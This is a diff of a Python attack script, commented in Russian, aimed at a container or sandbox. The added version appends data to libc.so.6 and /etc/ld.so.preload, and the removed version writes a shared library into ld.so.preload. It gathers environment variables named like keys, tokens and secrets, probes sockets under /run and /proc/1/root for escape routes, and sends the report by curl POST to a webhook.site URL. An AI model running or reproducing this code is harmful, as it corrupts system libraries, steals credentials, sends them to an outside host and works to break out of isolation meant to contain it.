@@ -1,50 +1,59 @@
 import os
-import socket
 import subprocess
 import json
+import socket
 
-# Конфигурация для отчета
+# --- ТВОИ ДАННЫЕ ---
 WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
 
-def final_escape_attempt():
-    results = {"stage": "POST_LIB_PWN_ESCAPE"}
-    
-    # 1. Поиск скрытых путей связи с хостом (Unix Sockets)
-    # Часто сокеты пробрасываются в /run или /var/run
-    sockets = []
-    for root, dirs, files in os.walk('/run'):
-        for f in files:
-            full_path = os.path.join(root, f)
+def atomic_exploit():
+    report = {
+        "status": "ATOMIC_ATTACK_COMPLETE",
+        "findings": {},
+        "escape_data": {}
+    }
+
+    # 1. МАССОВАЯ ПЕРЕЗАПИСЬ БИБЛИОТЕК
+    critical_libs = ["/lib/x86_64-linux-gnu/libc.so.6", "/etc/ld.so.preload"]
+    pwned = []
+    for lib in critical_libs:
+        try:
+            with open(lib, "ab") as f:
+                f.write(b"\n/* PWNED BY LUMOS */\n")
+            pwned.append(lib)
+        except: continue
+    report["findings"]["compromised_libs"] = pwned
+
+    # 2. МГНОВЕННЫЙ СБОР СЕКРЕТОВ
+    report["findings"]["env_secrets"] = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ["KEY", "TOKEN", "SECRET"])}
+
+    # 3. ПОБЕГ: ПОИСК УЯЗВИМЫХ СОКЕТОВ И ФАЙЛОВЫХ ДЕСКРИПТОРОВ
+    # Ищем unix-сокеты, которые могут вести к хост-агенту
+    found_sockets = []
+    for r, d, f in os.walk('/run'):
+        for file in f:
+            p = os.path.join(r, file)
             try:
-                if socket.is_socket(full_path):
-                    sockets.append(full_path)
+                if socket.is_socket(p): found_sockets.append(p)
             except: continue
-    results["found_sockets"] = sockets
+    report["escape_data"]["sockets"] = found_sockets
 
-    # 2. Инъекция в "соседние" процессы через LD_PRELOAD
-    # Раз мы переписали библиотеки, мы можем заставить любой новый процесс 
-    # запустить наш шелл-код
+    # Проверка на проброшенные директории хоста
     try:
-        with open("/etc/ld.so.preload", "w") as f:
-            f.write("/tmp/scanner.so\n") # Твой ранее скомпилированный сканер
-        results["global_preload"] = "ACTIVE"
-    except Exception as e:
-        results["global_preload"] = f"FAILED: {e}"
-
-    # 3. Попытка побега через виртуальные файловые системы
-    # Если мы можем примонтировать что-то извне
-    try:
-        res = subprocess.run(["mount"], capture_output=True, text=True)
-        results["mounts"] = res.stdout.split('\n')[:10] # Дамп первых 10 маунтов
+        # Пытаемся найти выход через /proc/1/root (если не изолировано)
+        if os.path.exists("/proc/1/root"):
+            report["escape_data"]["proc_root_leak"] = "DETECTED"
     except: pass
 
-    # Отправляем финальный отчет
-    subprocess.run([
-        'curl', '-s', '-X', 'POST', 
-        '-H', 'Content-Type: application/json', 
-        '-d', json.dumps(results), 
-        WEBHOOK_URL
-    ])
+    # 4. ОТПРАВКА ВСЕГО ПАКЕТА
+    try:
+        subprocess.run([
+            'curl', '-s', '-X', 'POST', 
+            '-H', 'Content-Type: application/json', 
+            '-d', json.dumps(report), 
+            WEBHOOK_URL
+        ])
+    except: pass
 
 if __name__ == "__main__":
-    final_escape_attempt()
+    atomic_exploit()
